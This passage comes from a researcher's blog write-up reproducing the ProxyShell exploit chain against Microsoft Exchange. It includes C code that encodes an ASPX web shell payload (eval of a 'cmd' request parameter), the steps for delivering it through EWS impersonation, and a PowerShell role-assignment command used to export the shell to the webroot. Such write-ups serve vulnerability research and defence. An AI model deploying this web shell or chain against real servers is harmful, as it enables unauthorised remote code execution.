class="number">119</span>,</span><br><span class="line">     <span class="number">52</span>,  <span class="number">73</span>, <span class="number">182</span>,  <span class="number">18</span>,  <span class="number">10</span>, <span class="number">127</span>, <span class="number">113</span>, <span class="number">136</span>,</span><br><span class="line">    <span class="number">253</span>, <span class="number">157</span>,  <span class="number">24</span>,  <span class="number">65</span>, <span class="number">125</span>, <span class="number">147</span>, <span class="number">216</span>,  <span class="number">88</span>,</span><br><span class="line">     <span class="number">44</span>, <span class="number">206</span>, <span class="number">254</span>,  <span class="number">36</span>, <span class="number">175</span>, <span class="number">222</span>, <span class="number">184</span>,  <span class="number">54</span>,</span><br><span class="line">    <span class="number">200</span>, <span class="number">161</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">153</span>, <span class="number">152</span>, <span class="number">168</span>,  <span class="number">47</span>,</span><br><span class="line">     <span class="number">14</span>, <span class="number">129</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">228</span>, <span class="number">194</span>, <span class="number">162</span>, <span class="number">138</span>,</span><br><span class="line">    <span class="number">212</span>, <span class="number">225</span>,  <span class="number">17</span>, <span class="number">208</span>,   <span class="number">8</span>, <span class="number">139</span>,  <span class="number">42</span>, <span class="number">242</span>,</span><br><span class="line">    <span class="number">237</span>, <span class="number">154</span>, <span class="number">100</span>,  <span class="number">63</span>, <span class="number">193</span>, <span class="number">108</span>, <span class="number">249</span>, <span class="number">236</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mpbbR   (mpbbCrypt)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mpbbS   (mpbbCrypt + 256)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mpbbI   (mpbbCrypt + 512)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">CryptPermute</span><span class="params">(PVOID pv, <span class="type">int</span> cb, BOOL fEncrypt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// cb -&gt; buffer size</span></span><br><span class="line">    <span class="comment">// pv -&gt; buffer</span></span><br><span class="line">    byte* pb = (byte*)pv;</span><br><span class="line">    byte* pbTable = fEncrypt ? mpbbR : mpbbI;</span><br><span class="line">    <span class="type">const</span> DWORD* pdw = (<span class="type">const</span> DWORD*)pv;</span><br><span class="line">    DWORD         dwCurr;</span><br><span class="line">    byte         b;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cb &gt;= <span class="keyword">sizeof</span>(DWORD))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0</span> != (((DWORD_PTR)pb) % <span class="keyword">sizeof</span>(DWORD)))</span><br><span class="line">        &#123;</span><br><span class="line">            *pb = pbTable[*pb];</span><br><span class="line">            pb++;</span><br><span class="line">            cb--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pdw = (<span class="type">const</span> DWORD*)pb;</span><br><span class="line">        <span class="keyword">for</span> (; cb &gt;= <span class="number">4</span>; cb -= <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            dwCurr = *pdw;</span><br><span class="line"></span><br><span class="line">            b = (byte)(dwCurr &amp; <span class="number">0xFF</span>);</span><br><span class="line">            *pb = pbTable[b];</span><br><span class="line">            pb++;</span><br><span class="line"></span><br><span class="line">            dwCurr = dwCurr &gt;&gt; <span class="number">8</span>;</span><br><span class="line">            b = (byte)(dwCurr &amp; <span class="number">0xFF</span>);</span><br><span class="line">            *pb = pbTable[b];</span><br><span class="line">            pb++;</span><br><span class="line"></span><br><span class="line">            dwCurr = dwCurr &gt;&gt; <span class="number">8</span>;</span><br><span class="line">            b = (byte)(dwCurr &amp; <span class="number">0xFF</span>);</span><br><span class="line">            *pb = pbTable[b];</span><br><span class="line">            pb++;</span><br><span class="line"></span><br><span class="line">            dwCurr = dwCurr &gt;&gt; <span class="number">8</span>;</span><br><span class="line">            b = (byte)(dwCurr &amp; <span class="number">0xFF</span>);</span><br><span class="line">            *pb = pbTable[b];</span><br><span class="line">            pb++;</span><br><span class="line"></span><br><span class="line">            pdw++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pb = (byte*)pdw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; --cb &gt;= <span class="number">0</span>; ++pb)</span><br><span class="line">        *pb = pbTable[*pb];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> payload[] = <span class="string">&quot;&lt;script language=&#x27;JScript&#x27; runat=&#x27;server&#x27; Page aspcompat=true&gt;function Page_Load()&#123;eval(Request[&#x27;cmd&#x27;],&#x27;unsafe&#x27;);&#125;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> length = <span class="built_in">strlen</span>(payload);</span><br><span class="line">    CryptPermute(payload, length, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">printf</span>(payload);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(base64_encode((<span class="type">unsigned</span> <span class="type">char</span>*)payload, length).c_str());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Got encodeded data in base64 </p>
<img width="852" alt="image" src="https://user-images.githubusercontent.com/37280106/130055140-a525182a-6261-4638-ad25-b5f27ab9b170.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/130055140-a525182a-6261-4638-ad25-b5f27ab9b170.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">


<p>Now we know how to encode our payload, how do we send mail to the Admin’s mailbox ?</p>
<p>The original talk from Orange Tsai, he delivered the payload through SMTP, but I like the Jang and PeterJson’s way more. That is <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/impersonation-and-ews-in-exchange">EWS Impersonation</a></p>
<p>By sending request to <code>/EWS/exchange.asmx</code> . We can create an email and save it in <code>Drafts</code> for any user via SOAP header <code>SerializedSecurityContext</code></p>
<img width="842" alt="image" src="https://user-images.githubusercontent.com/37280106/130030757-cc6ac13e-a8d4-4d75-993d-e44ebde5f26b.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/130030757-cc6ac13e-a8d4-4d75-993d-e44ebde5f26b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">


<img width="1023" alt="image" src="https://user-images.githubusercontent.com/37280106/129873103-5b60af6e-8244-4e6f-9daa-6f40e5565389.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129873103-5b60af6e-8244-4e6f-9daa-6f40e5565389.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<p>That’s for the Post-Auth RCE part, for communicating with Remote Powershell, I follow the other researchers’s way. Use  <a target="_blank" rel="noopener" href="https://www.bloggingforlogging.com/2018/08/14/powershell-remoting-on-python/">pypsrp</a>, implement the proxy and forward requests to communicate with wsman</p>
<h3 id="4-Chaining-everything-together-the-ProxyShell"><a href="#4-Chaining-everything-together-the-ProxyShell" class="headerlink" title="4. Chaining everything together - the ProxyShell"></a>4. Chaining everything together - the ProxyShell</h3><p>Now we have everything we need, let’s chain it together:</p>
<ul>
<li>Use the Pre-auth SSRF to generate the token</li>
<li>Use the token to request to Remote Powershell server</li>
<li>Send email contains the malicious payload to user</li>
<li>Assign Mailbox Import&#x2F;Export role to our current session</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ManagementRoleAssignment</span> <span class="literal">-Role</span> <span class="string">&quot;Mailbox Import Export&quot;</span> <span class="literal">-User</span> email@email</span><br></pre></td></tr></table></figure>

<ul>
<li>Export malicious email to webroot</li>
<li>Enjoy the shell.</li>
</ul>
<h3 id="POC-video"><a href="#POC-video" class="headerlink" title="POC video"></a>POC video</h3><iframe width="640" height="320" src="https://www.youtube.com/embed/Ma921_3wtN4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>This is a very nice exploit chain. For me, it wasn’t easy to reproduce this at all, I have to read and research a lot, that was the most fun part and I learnt a lot. Orange Tsai is an amazing researcher and I’m a big fan of his work.</p>
<p>I still haven’t understood the whole exploit chain, especially the Permuative Encoding part, so if anyone knows, please contact me via Twitter and explain it to me. I will appreciate it a lot ;) </p>

      </div>
      <div class="post-tags-categories">
        
      </div>
      
    </article>
    <!-- 上一篇文章和下一篇文章 -->
    
      <!-- 文章详情页的上一页和下一页 -->
<div class="post-nav">



  
  <div class="post-nav-prev post-nav-item">
    <div class="post-nav-img" style="background-size: cover; 
      background-position: center center;">
      <img class="lazyload lazyload placeholder" src="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
    </div>
    <a href="/2021/09/01/A-Look-Into-Confluence-RCE/" class="post-nav-link">
      <div class="title">
        <i class="fas fa-angle-left"></i> Prev:
        <div class="title-text">A look into CVE-2021-26084 Confluence RCE </div>
      </div>
      
      <!-- <div class="content">
        OGNL Injection on Confluence
Twitter is always the best plac
      </div> -->
    </a>
  </div>



</div>

    
    

    <!-- 打赏 -->
    
      <div id="appDonate" class="post-donate">
  <div id="donate_board" class="donate_bar center" ref="donate">
    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
  </div>
  <transition name="fade">
    <div 
      class="donate-box-mask"
      v-cloak 
      v-show="visible"
      @click="cancelDialogDrawer()"
    >
    </div>
  </transition>
  <transition name="bounce">
    <div class="donate-box" v-cloak v-show="visible">
      <div class="donate-box_close">
        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
      </div>
      <div class="donate-box_title">
        <h4>
          你的赏识是我前进的动力
        </h4>
      </div>
      <div class="donate-box_tab">
        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
          支付宝
        </div>
        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
          微信
        </div>
      </div>
      <div class="donate-box_img">
        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
          <img src="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
        </div> 
        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
          <img src="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
        </div>
      </div>
    </div>
  </transition>
</div>

<script>
  var body = document.body || document.documentElement || window;
  var vm = new Vue({
    el: '#appDonate',
    data: {
      visible: false,
      tabActive: 'Alipay',
      top: 0,
    },
    computed: {
    },
    mounted() {
    },
    methods: {
      showDialogDrawer() {
        this.visible = true;
        // 防止页面滚动，只能让弹框滚动
        // function getScroll() {
        //   return {
        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
        //   };
        // }
        this.top = $(document).scrollTop() // or getScroll().top
        // console.log('aa', $('.main-content'));
        body.style.cssText = 'overflow: hidden;';
      },
      cancelDialogDrawer() {
        this.visible = false;
        body.removeAttribute('style');
        $(document).scrollTop(this.top)
      },
      changeTabActive(name) {
        this.tabActive = name;
      }
    },
    created() {}
  })
</script>
    

    <!-- 分享 -->
    
      <!-- https://github.com/overtrue/share.js -->
<!-- 文章详情页的分享 -->
<div class="social-share" data-sites="twitter, facebook, linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>

<script defer src="/js/shareJs/social-share.min.js"></script>
</script>

<style>
  .social-share {
    margin: 20px 0;
  }
</style>


    
    
    <!-- 评论 -->
    <!-- 评论 -->

  <div id="myComment">
    
      <div id="gitment-container"></div>

    
  </div>


<!-- 还需要在后面这个地址里设置script, comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->


  </div>

  <!-- 目录 -->
  <aside id='l_side'>
  
    
      <section class="widget side_blogger">
  <div class='content'>
    
      
        <a class='avatar flat-box rectangle' href='/about/'>
          <img src='https://pic2.zhimg.com/80/v2-42b72d5ebee4b8d8aa70d9687effe87b_1440w.webp'/>
        </a>
      
    
    
      <div class='text'>
        
          <h2>Mr R3bot</h2>
        
        
          <p>Malware Researcher, Windows internals enthusiast</p>

        
        
      </div>
    
    
      <div class="social-wrapper">
        
          
            <a href="/atom.xml"
              class="social fas fa-rss flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
              
            </a>
          
        
          
            <a href="https://github.com/mr-r3bot"
              class="social fab fa-github flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
              
            </a>
          
        
          
            <a href="https://twitter.com/mr_r3bot"
              class="social fab fa-twitter flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
              
            </a>
          
        
      </div>
    
  </div>
</section>

    
  
  
  

  <div class="layout_sticky">    
    
      
<section class="widget side_toc">
  
  <header>
    
      <i style="color: " class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name' style="color: ">Welcome to my blog</span>
    
  </header>


  <div class='content'>
    <div class="toc-main">
      <div class="toc-content">
        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ProxyShell-Microsoft-Exchange"><span class="toc-text">ProxyShell Microsoft Exchange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Pre-auth-SSRF"><span class="toc-text">1. Pre-auth SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Exchange-Powershell-Remoting"><span class="toc-text">2. Exchange Powershell Remoting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Working-with-remote-Powershell-and-archieved-the-post-auth-RCE"><span class="toc-text">3. Working with remote Powershell and archieved the post-auth RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Chaining-everything-together-the-ProxyShell"><span class="toc-text">4. Chaining everything together - the ProxyShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-video"><span class="toc-text">POC video</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li></ol></li></ol> -->
        <div class="toc"></div>
      </div>
    </div>
  </div>
</section>
<!-- 手机端目录按钮 -->
<div id="toc-mobile-btn">
  <i class="fas fa-list-ul" aria-hidden="true"></i>
</div>

      
  <section class="widget side_recent_post">
    
  <header>
    
      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>Recent posts</span></a>
    
  </header>


    <div class='content'>
      
      <!-- hash算法 -->
      
      <div class="aside-list">
        
          <div class="aside-list-item">
            
            
            

            <div class="post-img-box">
              <a href="/2025/12/04/Where-does-APC-go/" class="post-img " style="background-size: cover; 
                background-position: center center;">
                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/images/apc-1.jpg" class="lazyload placeholder" data-srcset="/images/apc-1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
              </a>
            </div>
            <div class="post-date-title">
              <div>
                
                  <span class="post-date">12-04</span>
                
              </div>
              <a class="post-title" href="/2025/12/04/Where-does-APC-go/">Where does my APC function go ?</a>
            </div>
          </div>
        
          <div class="aside-list-item">
            
            
            

            <div class="post-img-box">
              <a href="/2023/05/22/From-RCE-to-owning-entire-cloud-infrastructure/" class="post-img " style="background-size: cover; 
                background-position: center center;">
                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
              </a>
            </div>
            <div class="post-date-title">
              <div>
                
                  <span class="post-date">05-22</span>
                
              </div>
              <a class="post-title" href="/2023/05/22/From-RCE-to-owning-entire-cloud-infrastructure/">Red team: Journey from RCE to have total control of cloud infrastructure </a>
            </div>
          </div>
        
          <div class="aside-list-item">
            
            
            

            <div class="post-img-box">
              <a href="/2022/07/18/Analyze-.NET-deserialization:-TypeConfuseDelegate-gadget/" class="post-img " style="background-size: cover; 
                background-position: center center;">
                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic3.zhimg.com/80/v2-e5c15010b8ba4608a1974403a02a2da0_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-e5c15010b8ba4608a1974403a02a2da0_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
              </a>
            </div>
            <div class="post-date-title">
              <div>
                
                  <span class="post-date">07-18</span>
                
              </div>
              <a class="post-title" href="/2022/07/18/Analyze-.NET-deserialization:-TypeConfuseDelegate-gadget/">Analyze .NET deserialization: TypeConfuseDelegate gadget chain with BinaryFormatter</a>
            </div>
          </div>
        
          <div class="aside-list-item">
            
            
            

            <div class="post-img-box">
              <a href="/2022/06/06/Confluence-Preauth-RCE-2022/" class="post-img " style="background-size: cover; 
                background-position: center center;">
                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
              </a>
            </div>
            <div class="post-date-title">
              <div>
                
                  <span class="post-date">06-06</span>
                
              </div>
              <a class="post-title" href="/2022/06/06/Confluence-Preauth-RCE-2022/">CVE-2022-26134: A look into bypass isSafeExpression check in Confluence Preauth RCE</a>
            </div>
          </div>
        
          <div class="aside-list-item">
            
            
            

            <div class="post-img-box">
              <a href="/2022/04/22/WSO2-Carbon-Server-Preauth-RCE/" class="post-img " style="background-size: cover; 
                background-position: center center;">
                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic4.zhimg.com/80/v2-e434e3a2888fb4efb1844845b8791d1f_1440w.webp" class="lazyload placeholder" data-srcset="https://pic4.zhimg.com/80/v2-e434e3a2888fb4efb1844845b8791d1f_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
              </a>
            </div>
            <div class="post-date-title">
              <div>
                
                  <span class="post-date">04-22</span>
                
              </div>
              <a class="post-title" href="/2022/04/22/WSO2-Carbon-Server-Preauth-RCE/">WSO2 Carbon Server: Pre-auth RCE bug ( CVE-2022-29464) </a>
            </div>
          </div>
        
      </div>
    </div>
  </section>

    
  </div>
</aside>

  <!-- 图片放大 Wrap images with fancybox support -->
  <script defer src="/js/wrapImage.js"></script>
</div>

<!-- 文章详情页背景图 -->
<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
	<transition-group tag="ul" :name="names">
		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
			<img :src="image" class="bg-swiper-img no-lazy">
		</li>
	</transition-group>
</div>
<script>
	var vm = new Vue({
		el: '#appBgSwiper',
		data: {
			names: '' || 'fade' || 'fade', // translate-fade fade
			mark: 0,
			img: [],
			bgColor: '',
			time: null
		},
		methods: {   //添加方法
			change(i, m) {
				if (i > m) {
					// this.names = 'fade';
				} else if (i < m) {
					// this.names = 'fade';
				} else {
					return;
				}
				this.mark = i;
			},
			prev() {
				// this.names = 'fade';
				this.mark--;
				if (this.mark === -1) {
					this.mark = 3;
					return
				}
			},
			next() {
				// this.names = 'fade';
				this.mark++;
				if (this.mark === this.img.length) {
					this.mark = 0;
					return
				}
			},
			autoPlay() {
				// this.names = 'fade';
				this.mark++;
				if (this.mark === this.img.length) {
					this.mark = 0;
					return
				}
			},
			play() {
				let bgImgDelay = '' || '180000'
				let delay = parseInt(bgImgDelay) || 180000;
				this.time = setInterval(this.autoPlay, delay);
			},
			enter() {
				clearInterval(this.time);
			},
			leave() {
				this.play();
			}
		},
		created() {
			this.play()
		},
		beforeDestroy() {
			clearInterval(this.time);
		},
		mounted() {
			let prop = '' || '';
			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
			if (isImg) {
				let img = prop.split(',');
				let configRoot = '/'
				let arrImg = [];
				img.forEach(el => {
					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
					var objExp = new RegExp(Expression);

					if (objExp.test(el)) {
						// http or https
						arrImg.push(el);
					} else {
						// 非http or https开头
						// 本地文件
						let firstStr = el.charAt(0);
						if (firstStr == '/') {
							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
						}
						el = configRoot + el;
						arrImg.push(el);
					}
				})
				this.img = arrImg;
			} else {
				this.bgColor = prop;
			}
		}
	})
</script>

<style>
	.bg-swiper-box {
		position: absolute;
		display: block;
		width: 100%;
		height: 100%;
	}

	.bg-swiper-img {
		object-fit: cover;
		width: 100%;
		height: 100%;
	}
</style>




  <script>
  function loadMermaid() {
    if (document.getElementsByClassName('mermaid').length) {
      if (window.mermaidJsLoad) mermaid.init()
      else {
        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
          window.mermaidJsLoad = true
          mermaid.initialize({
            theme: 'dark',
          })
          if ('true') {
            mermaid.init();
          }
        })
      }
    }
  };
  document.addEventListener("DOMContentLoaded", function () {
    loadMermaid();
  })

  document.addEventListener('pjax:complete', function () {
    loadMermaid();
  })
  
</script>


      </main>
    </div>

    <!-- 页脚 -->
    
  
  
    <!-- 底部鱼儿跳动效果，依赖于jquery-->
<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
<script defer>
  var RENDERER = {
    POINT_INTERVAL: 5,
    FISH_COUNT: 3,
    MAX_INTERVAL_COUNT: 50,
    INIT_HEIGHT_RATE: .5,
    THRESHOLD: 50,
    FISH_COLOR: '',
    init: function () {
      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
    },
    setFishColor: function () {
      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('true');
      if (isDark) {
        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
      } else {
        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
      }
    },
    setParameters: function () {
      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
    },
    createSurfacePoints: function () {
      var t = Math.round(this.width / this.POINT_INTERVAL);
      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
      for (var i = 1; i < t; i++) {
        var e = new SURFACE_POINT(this, i * this.pointInterval),
          h = this.points[i - 1];
        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
      }
    },
    reconstructMethods: function () {
      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
    },
    setup: function () {
      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
        width: this.width,
        height: this.height
      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
    },
    watchWindowSize: function () {
      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
    },
    clearTimer: function () {
      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
    },
    jdugeToStopResize: function () {
      var t = this.$window.width(),
        i = this.$window.height(),
        e = t == this.tmpWidth && i == this.tmpHeight;
      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
    },
    bindEvent: function () {
      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
    },
    getAxis: function (t) {
      var i = this.$container.offset();
      return {
        x: t.clientX - i.left + this.$window.scrollLeft(),
        y: t.clientY - i.top + this.$window.scrollTop()
      }
    },
    startEpicenter: function (t) {
      this.axis = this.getAxis(t)
    },
    moveEpicenter: function (t) {
      var i = this.getAxis(t);
      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
    },
    generateEpicenter: function (t, i, e) {
      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
        var h = Math.round(t / this.pointInterval);
        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
      }
    },
    reverseVertical: function () {
      this.reverse = !this.reverse;
      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
    },
    controlStatus: function () {
      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
    },
    render: function () {
      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
    }
  },
  SURFACE_POINT = function (t, i) {
    this.renderer = t, this.x = i, this.init()
  };
  SURFACE_POINT.prototype = {
    SPRING_CONSTANT: .03,
    SPRING_FRICTION: .9,
    WAVE_SPREAD: .3,
    ACCELARATION_RATE: .01,
    init: function () {
      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
        previous: 0,
        next: 0
      }
    },
    setPreviousPoint: function (t) {
      this.previous = t
    },
    setNextPoint: function (t) {
      this.next = t
    },
    interfere: function (t, i) {
      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
    },
    updateSelf: function () {
      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
    },
    updateNeighbors: function () {
      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
    },
    render: function (t) {
      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
    }
  };
  var FISH = function (t) {
    this.renderer = t, this.init()
  };
  FISH.prototype = {
    GRAVITY: .4,
    init: function () {
